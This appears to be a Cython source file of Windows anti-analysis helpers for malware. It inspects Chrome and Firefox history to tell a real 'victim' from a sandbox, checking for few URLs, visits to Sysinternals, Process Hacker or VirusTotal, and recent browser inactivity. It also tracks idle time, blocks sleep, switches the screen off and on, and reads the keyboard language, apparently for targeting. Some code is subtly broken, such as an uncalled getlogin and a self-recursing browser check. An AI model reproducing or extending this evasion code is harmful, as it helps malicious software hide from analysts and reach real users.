from winreg import HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, OpenKey, QueryValueEx
from os import getlogin
from os.path import exists,getctime
from os.path import join as path_join
from os import listdir
from shutil import copyfile
import datetime
import sqlite3
from ctypes import Structure, windll, c_uint, sizeof, byref,WinDLL


class LASTINPUTINFO(Structure):
    _fields_ = [
        ('cbSize', c_uint),
        ('dwTime', c_uint),
    ]


cpdef float get_idle_duration() :
    """
    this method return the number of seconds which the current pc is idle, as float.
    """
    lastInputInfo = LASTINPUTINFO()
    lastInputInfo.cbSize = sizeof(lastInputInfo)
    windll.user32.GetLastInputInfo(byref(lastInputInfo))
    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
    return millis / 1000.0

cpdef bint prevent_sleep(bint enable=True):
    """we are preventing/allowing sleep"""
    ES_CONTINUOUS = 0x80000000
    ES_SYSTEM_REQUIRED = 0x00000001
    if not enable:
        windll.kernel32.SetThreadExecutionState(
            ES_CONTINUOUS)
        return True
    windll.kernel32.SetThreadExecutionState(
        ES_CONTINUOUS | ES_SYSTEM_REQUIRED)
    return True



cpdef bint turn_screen_off():
    """
    this function mimick an hibernate event, putting off you screens
    """
    WM_SYSCOMMAND = 0x0112
    SC_MONITORPOWER = 0xF170
    window = windll.kernel32.GetConsoleWindow()
    windll.user32.SendMessageA(window, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
    return True

cpdef bint turn_screen_on():
    MOUSEEVENTF_WHEEL = 0x0800
    windll.user32.mouse_event(1, 1, 1, 0, 0)
    return True



cpdef tuple getDefaultBrowser():
    """
    this function return tuple of (full_path_to_browser_exe,browser_name)
    """
    # Get the user choice
    browserName = ""
    browserPath = ""
    with OpenKey(HKEY_CURRENT_USER,
                 r'SOFTWARE\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice') as regkey:
        browserName = QueryValueEx(regkey, 'ProgId')[0]
    with OpenKey(HKEY_CLASSES_ROOT, r'{}\shell\open\command'.format(browserName)) as regkey:
        browser_path_tuple = QueryValueEx(regkey, None)
        browserPath = browser_path_tuple[0].split('"')[1]
    return (browserPath,browserName)



cpdef bint is_debug_in_history(list urls):
    """we return here true if we find one of those urls in the history
       as those can indicate we are messing with power user or even worse."""
    debug_list = ["https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns",
                  "https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer",
                  "https://docs.microsoft.com/en-us/sysinternals/downloads/procdump",
                  "https://docs.microsoft.com/en-us/sysinternals/downloads/procmon",
                  "https://processhacker.sourceforge.io/",
                  "https://www.virustotal.com",
                  "https://docs.microsoft.com/en-us/sysinternals"]
    for url in urls:
        for debug_url in debug_list:
            if url in debug_url:
                return True
    return False


def date_from_webkit(webkit_timestamp):
    epoch_start = datetime.datetime(1601,1,1)
    delta = datetime.timedelta(microseconds=int(webkit_timestamp))
    return epoch_start + delta

def dont_used_browser(last_visit_time) -> bool:
    """
    we return here true if the victim didn't used the browser for at least 2 days
    """
    now = datetime.datetime.now()
    last_visit = date_from_webkit(last_visit_time)
    return (now - last_visit).days > 2


cpdef bint parseFirefox_history(str path):
    """
    :param path: folder of profile
    """
    newPath = f"C:\\Users\\{getlogin}\\AppData\\Local\\temp\\FirefoxNothing"
    places_file = path_join(path,"places.sqlite")
    if not exists(places_file):
        return True
    copyfile(places_file,newPath)
    con = sqlite3.connect(newPath)
    cursor = con.cursor()
    cursor.execute("SELECT moz_places.url from moz_places")
    urls = cursor.fetchall()
    if len(urls) < 50:
        return False
    if is_debug_in_history(urls):
        return False
    #//TODO: add time diff here also
    return True




def parseChrome_history(path : str) -> bool:
    newPath = f"C:\\Users\\{getlogin}\\AppData\\Local\\temp\\ChromeNothing"
    copyfile(path,newPath)
    con = sqlite3.connect(newPath)
    cursor = con.cursor()
    cursor.execute("SELECT url FROM urls")
    urls = cursor.fetchall()
    if len(urls) < 50:
        return False # we return false if we have less than 50 urls in history
    if is_debug_in_history(urls):
        return False
    last_visit_time = (row[0] for row in cursor.execute("SELECT last_visit_time FROM urls LIMIT 1"))
    if dont_used_browser(last_visit_time):
        return False # if he didn't used browser in the last 2 days. return false.
    return True



def is_normal_browser_user(bType=False) -> bool:
    """
    :param bType: browser type, in string
    """
    browser_location,browser_name = getDefaultBrowser()
    if 'chrome' in browser_name.lower():
        return is_normal_browser_user(bType='chrome')
    if 'firefox' in browser_name.lower():
        return is_normal_browser_user(bType='firefox')
    else:
        print('[*] could not figure out the browser type')
    if bType == 'chrome':
        possible_locations = [f"C:\\Users\\{getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History",
                              f"C:\\Users\\{getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\databases"]
        for location in possible_locations:
            if exists(location):
                if not parseChrome_history(location):
                    return False
                return True
        return False
    if bType == "firefox":
        profiles = listdir(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\")
        if not parseFirefox_history(max(profiles,key=getctime)):
            return False
    return True




cpdef str get_keyboard_language():
    """
    Gets the keyboard language in use by the current
    active window process.
    """

    user32 = WinDLL('user32', use_last_error=True)

    # Get the current active window handle
    handle = user32.GetForegroundWindow()

    # Get the thread id from that window handle
    threadid = user32.GetWindowThreadProcessId(handle, 0)

    # Get the keyboard layout id from the threadid
    layout_id = user32.GetKeyboardLayout(threadid)

    # Extract the keyboard language id from the keyboard layout id
    language_id = layout_id & (2 ** 16 - 1)

    # Convert the keyboard language id from decimal to hexadecimal
    language_id_hex = hex(language_id)

    # Check if the hex value is in the dictionary.
    return str(language_id_hex)